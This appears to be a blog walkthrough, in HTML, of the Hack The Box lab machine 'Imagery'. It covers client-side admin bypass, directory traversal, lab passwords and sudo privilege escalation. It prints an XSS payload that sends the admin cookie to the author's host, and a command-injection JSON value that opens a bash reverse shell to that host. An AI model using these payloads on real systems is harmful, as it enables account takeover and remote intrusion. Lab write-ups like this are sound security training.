@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Imagery | whoami</title>
+<meta name="keywords" content="">
+<meta name="description" content="Medium Linux">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/htb/imagery-medium-linux/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/htb/imagery-medium-linux/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/htb/imagery-medium-linux/">
+  <meta property="og:site_name" content="whoami">
+  <meta property="og:title" content="Imagery">
+  <meta property="og:description" content="Medium Linux">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Imagery">
+  <meta name="twitter:description" content="Medium Linux">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hack The Box",
+      "item": "http://localhost:1313/htb/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Imagery",
+      "item": "http://localhost:1313/htb/imagery-medium-linux/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Imagery",
+  "name": "Imagery",
+  "description": "Medium Linux",
+  "keywords": [
+    
+  ],
+  "articleBody": "nmap scan We have ssh and a http on 8000 ssh version is quite new, so unlikely any exploitable vulns there - so lets go to the web app\nWeb app using Werkzeug 3.1.3 and Python 3.12.7\nThe web app is a gallery app, where you can register/login. I made an account hacker@imagery.com hacker\nYou are able to upload images and see them in your gallery. Playing around with the app, it seems pretty much a single page app and makes calls to the server which returns JSON formatted information.\nSo I messed with the Post request for /upload_image\nSo the app does not do a check to make sure the actual image content is an “image”, it just checks the extension. It also allows me to upload to other directories, because this image does not show up on the gallery and is an error (this is my assumption)\nso, if I upload a key into .ssh folder, I should be able to ssh into the box?\nwhen we upload a legit file, it goes to /uploads/_.jpg my thinking - is there a way we can upload a web shell, but with any of these extensions? we can upload stuff so it works\nCLUE FROM JOREL - it’s not file upload! Look at the javascript\nreading the javascript, we see there is an adminPanel and the user has to have isAdmin set to True to access it: we can see clearly that this is the request which checks the auth state of the user - all the security is client side in the javascript so we can simply modify the response coming back from this request.\nokay setting isAdmin in the response works - but I cant access the users list and looking at the javascript, its because the endpoint /admin/users - a call is made and the response in here will contain the information - the only thing being sent here is the cookie\nso the check on whether the user is able to do these functionalities lies in the cookie\nHTTP/1.1 200 OK Server: Werkzeug/3.1.3 Python/3.12.7 Date: Wed, 01 Oct 2025 06:37:31 GMT Content-Type: application/json Content-Length: 105 Vary: Cookie Set-Cookie: session=.eJxNjTEKhEAMRe-SWkRBcLFaS08xhJmoQZORyVjIsnfftVAs33sf_gcC27biMQTooHo1dYtVCwWw9UFYoRtxNTrZsWyULCpm1sllsrwbpeficg69j7vmu51SUej_MaNfKL1ZcKJ0lD4KfH9EwjAE.aNzMKw.cNLfdEa3BUoRY7z60yvsCwuC4sA; Path=/ Connection: close { \"displayId\":\"08417a07\", \"isAdmin\":false, \"isTestuser\":false, \"message\":\"Login successful.\", \"success\":true } # endpoints /auth_status?t=${new Date().getTime()} - gets permission /register - add user to database /login - sets session cookie /logout - clears cookie /images - shows images (json) /delete_image - /edit_image_details - not yet implemented /convert_image - not yet implemented /apply_visual_transform /delete_image_metadata /report_bug /admin/bug_reports /admin/delete_bug_report /admin/delete_user /admin/users /get_image_collections /create_image_collection /move_images_to_collection {“displayId”:“08417a07”,“isAdmin”:false,“is_impersonating_testuser”:false,“is_testuser_account”:false,“username”:“hacker@imagery.com”}.\nLooking through /report_bug - we see that report.details is not being sanatised. There is also a message saying that “admin review in progress” when we report a bug - so we can put a XSS payload here and steal the admin cookie\n# xss payload \u003cimg src=x onerror=\"fetch('http://10.10.16.196/?cookie='+document.cookie)\" /\u003e we obtain the admin cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNzobw.8BDI3agM4PsQ-47oouktdCell1k\nUsing this we are able to see the features of the admin panel. We are able to ‘download log’ - the get request for this has directory traversal vulnerability\nThe interesting users we have on the box are:\nroot web mark dhcpcd Since we only have directory traversal and cant really upload files, lets try to map out and look at the flask app python files\nwe cause an error by trying to access a file we can’t, which leaks a path to us: /home/web/web/app.py\n/home/web/web/templates/index.html exists and is the main page\nin the above code, we can see that {user_entry[‘username’]} is something we control\n/home/web/web/config.py looking at the above config.py - we see that there is a db.json file. we also see that application/pdf and pdf extension is also allowed. we also see that /uploads/admin/converted and /uploads/admin/transformed are paths\nwe have the password for testuser@imagery.htb - lets see if theres anything different with this account\niambatman\nwith this account we are able to hit the “under development” api endpoints\nlooking at the imports for app.py - we can see there is a utils.py /home/web/web/utils.py\n// post request to /apply_visual_transform { \"imageId\":\"c9ed35a8-5614-4d41-a6b9-7201391e60bf\", \"transformType\": \"crop\", \"params\":{ \"width\":\"100\", \"height\":\"100\", \"x\":\"1\", \"y\":\";bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.16.196/9000 0\u003e\u00261'\" } } possible priv esc vectors: got the admin@imager.htb password but dont know if that helps\nstrongsandofbeach\nlooking around more, there is a backup .zip.aes file in /var/backup bringing this back to kali vm, there is a password for the encrypted file - lets write a script to brute force the password\nbestfriends\nwe get a backup version of the web app and looking in db.json:\nwe have both mark and web passwords mark:supersmash web:spiderweb1234\nusing us, we change to mark\ndoing sudo -l shows that the charcol binary is able to run as sudo with no password by mark\nwe can start a charcol shell\nseeing in the help we can create cron jobs - create a reverse shell cron job\ncatch it pwned!\n",
+  "wordCount" : "809",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/htb/imagery-medium-linux/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "whoami",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="whoami (Alt + H)">whoami</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/htb/" title="HTB">
+                    <span>HTB</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Imagery
+    </h1>
+    <div class="post-description">
+      Medium Linux
+    </div>
+  </header> 
+  <div class="post-content md-content"><p>nmap scan
+<img alt="Imagery (Medium Linux).png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29.png">
+We have ssh and a http on 8000
+ssh version is quite new, so unlikely any exploitable vulns there - so lets go to the web app</p>
+<p>Web app using Werkzeug 3.1.3 and Python 3.12.7</p>
+<p>The web app is a gallery app, where you can register/login. I made an account
+<code>hacker@imagery.com</code>
+<code>hacker</code></p>
+<p>You are able to upload images and see them in your gallery. Playing around with the app, it seems pretty much a single page app and makes calls to the server which returns JSON formatted information.</p>
+<p>So I messed with the Post request for /upload_image</p>
+<p><img alt="Imagery (Medium Linux)-1.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-1.png"></p>
+<p>So the app does not do a check to make sure the actual image content is an &ldquo;image&rdquo;, it just checks the extension. It also allows me to upload to other directories, because this image does not show up on the gallery and is an error (this is my assumption)</p>
+<p>so, if I upload a key into .ssh folder, I should be able to ssh into the box?</p>
+<p>when we upload a legit file, it goes to <code>/uploads/&lt;IMAGEID&gt;_&lt;ORIGINALFILENAME&gt;.jpg</code>
+<img alt="Imagery (Medium Linux)-2.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-2.png">
+<img alt="Imagery (Medium Linux)-3.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-3.png"></p>
+<p>my thinking - is there a way we can upload a web shell, but with any of these extensions? we can upload stuff so it works</p>
+<p><em>CLUE FROM JOREL - it&rsquo;s not file upload! Look at the javascript</em></p>
+<p>reading the javascript, we see there is an adminPanel and the user has to have isAdmin set to True to access it:
+<img alt="Imagery (Medium Linux)-4.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-4.png">
+<img alt="Imagery (Medium Linux)-5.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-5.png">
+we can see clearly that this is the request which checks the auth state of the user - all the security is client side in the javascript so we can simply modify the response coming back from this request.</p>
+<p>okay setting isAdmin in the response works - but I cant access the users list and looking at the javascript, its because the endpoint /admin/users - a call is made and the response in here will contain the information - the only thing being sent here is the cookie</p>
+<p>so the check on whether the user is able to do these functionalities lies in the cookie</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: Werkzeug/3.1.3 Python/3.12.7
+Date: Wed, 01 Oct 2025 06:37:31 GMT
+Content-Type: application/json
+Content-Length: 105
+Vary: Cookie
+Set-Cookie: session=.eJxNjTEKhEAMRe-SWkRBcLFaS08xhJmoQZORyVjIsnfftVAs33sf_gcC27biMQTooHo1dYtVCwWw9UFYoRtxNTrZsWyULCpm1sllsrwbpeficg69j7vmu51SUej_MaNfKL1ZcKJ0lD4KfH9EwjAE.aNzMKw.cNLfdEa3BUoRY7z60yvsCwuC4sA; Path=/
+Connection: close
+
+{
+	&#34;displayId&#34;:&#34;08417a07&#34;,
+	&#34;isAdmin&#34;:false,
+	&#34;isTestuser&#34;:false,
+	&#34;message&#34;:&#34;Login successful.&#34;,
+	&#34;success&#34;:true
+}
+</code></pre><pre tabindex="0"><code># endpoints
+/auth_status?t=${new Date().getTime()} - gets permission
+
+/register - add user to database
+/login - sets session cookie
+/logout - clears cookie
+/images - shows images (json)
+/delete_image - 
+/edit_image_details - not yet implemented
+/convert_image - not yet implemented
+
+/apply_visual_transform
+/delete_image_metadata
+/report_bug
+
+/admin/bug_reports
+/admin/delete_bug_report
+/admin/delete_user
+/admin/users
+
+/get_image_collections
+/create_image_collection
+/move_images_to_collection
+</code></pre><p>{&ldquo;displayId&rdquo;:&ldquo;08417a07&rdquo;,&ldquo;isAdmin&rdquo;:false,&ldquo;is_impersonating_testuser&rdquo;:false,&ldquo;is_testuser_account&rdquo;:false,&ldquo;username&rdquo;:&ldquo;<a href="mailto:hacker@imagery.com">hacker@imagery.com</a>&rdquo;}.</p>
+<p>Looking through /report_bug - we see that
+<img alt="Imagery (Medium Linux)-6.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-6.png"></p>
+<p>report.details is not being sanatised. There is also a message saying that &ldquo;admin review in progress&rdquo; when we report a bug - so we can put a XSS payload here and steal the admin cookie</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"># xss payload
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;fetch(&#39;http://10.10.16.196/?cookie=&#39;+document.cookie)&#34;</span> <span class="p">/&gt;</span>
+</span></span></code></pre></div><p>we obtain the admin cookie:
+<img alt="Imagery (Medium Linux)-7.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-7.png"></p>
+<p><code>session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNzobw.8BDI3agM4PsQ-47oouktdCell1k</code></p>
+<p>Using this we are able to see the features of the admin panel.
+We are able to &lsquo;download log&rsquo; - the get request for this has directory traversal vulnerability</p>
+<p><img alt="Imagery (Medium Linux)-8.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-8.png"></p>
+<p>The interesting users we have on the box are:</p>
+<pre tabindex="0"><code>root
+web
+mark
+dhcpcd
+</code></pre><p>Since we only have directory traversal and cant really upload files, lets try to map out and look at the flask app python files</p>
+<p>we cause an error by trying to access a file we can&rsquo;t, which leaks a path to us:
+<img alt="Imagery (Medium Linux)-9.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-9.png"></p>
+<p>/home/web/web/app.py</p>
+<p>/home/web/web/templates/index.html exists and is the main page</p>
+<p>in the above code, we can see that {user_entry[&lsquo;username&rsquo;]} is something we control</p>
+<p>/home/web/web/config.py
+looking at the above config.py - we see that there is a <code>db.json</code> file.
+we also see that <code>application/pdf</code> and <code>pdf</code> extension is also allowed.
+we also see that <code>/uploads/admin/converted</code> and <code>/uploads/admin/transformed</code> are paths</p>
+<p><img alt="Imagery (Medium Linux)-10.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-10.png"></p>
+<p>we have the password for <a href="mailto:testuser@imagery.htb">testuser@imagery.htb</a> - lets see if theres anything different with this account</p>
+<p><code>iambatman</code></p>
+<p>with this account we are able to hit the &ldquo;under development&rdquo; api endpoints</p>
+<p>looking at the imports for app.py - we can see there is a utils.py
+/home/web/web/utils.py</p>
+<p><img alt="Imagery (Medium Linux)-12.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-12.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// post request to /apply_visual_transform
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;imageId&#34;</span><span class="p">:</span><span class="s2">&#34;c9ed35a8-5614-4d41-a6b9-7201391e60bf&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;transformType&#34;</span><span class="p">:</span> <span class="s2">&#34;crop&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;params&#34;</span><span class="p">:{</span>
+</span></span><span class="line"><span class="cl">		<span class="nt">&#34;width&#34;</span><span class="p">:</span><span class="s2">&#34;100&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nt">&#34;height&#34;</span><span class="p">:</span><span class="s2">&#34;100&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nt">&#34;x&#34;</span><span class="p">:</span><span class="s2">&#34;1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nt">&#34;y&#34;</span><span class="p">:</span><span class="s2">&#34;;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.196/9000 0&gt;&amp;1&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><img alt="Imagery (Medium Linux)-11.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-11.png"></p>
+<p>possible priv esc vectors:
+<img alt="Imagery (Medium Linux)-13.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-13.png"></p>
+<p><img alt="Imagery (Medium Linux)-14.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-14.png"></p>
+<p><img alt="Imagery (Medium Linux)-15.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-15.png">
+<img alt="Imagery (Medium Linux)-16.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-16.png"></p>
+<p>got the <a href="mailto:admin@imager.htb">admin@imager.htb</a> password but dont know if that helps</p>
+<p><img alt="Imagery (Medium Linux)-17.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-17.png"></p>
+<p><code>strongsandofbeach</code></p>
+<p>looking around more, there is a backup .zip.aes file in /var/backup
+bringing this back to kali vm, there is a password for the encrypted file - lets write a script to brute force the password</p>
+<p><img alt="Imagery (Medium Linux)-18.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-18.png"></p>
+<p><img alt="Imagery (Medium Linux)-19.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-19.png"></p>
+<p><code>bestfriends</code></p>
+<p>we get a backup version of the web app and looking in db.json:</p>
+<p><img alt="Imagery (Medium Linux)-20.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-20.png"></p>
+<p>we have both mark and web passwords
+<img alt="Imagery (Medium Linux)-21.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-21.png"></p>
+<p><code>mark:supersmash</code>
+<code>web:spiderweb1234</code></p>
+<p>using us, we change to mark</p>
+<p><img alt="Imagery (Medium Linux)-22.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-22.png">
+<img alt="Imagery (Medium Linux)-23.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-23.png"></p>
+<p>doing sudo -l shows that the charcol binary is able to run as sudo with no password by mark</p>
+<p>we can start a charcol shell</p>
+<p><img alt="Imagery (Medium Linux)-24.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-24.png"></p>
+<p>seeing in the help we can create cron jobs - create a reverse shell cron job</p>
+<p>catch it
+<img alt="Imagery (Medium Linux)-25.png" loading="lazy" src="/htb/imagery-medium-linux/Imagery%20%28Medium%20Linux%29-25.png"></p>
+<p>pwned!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">whoami</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
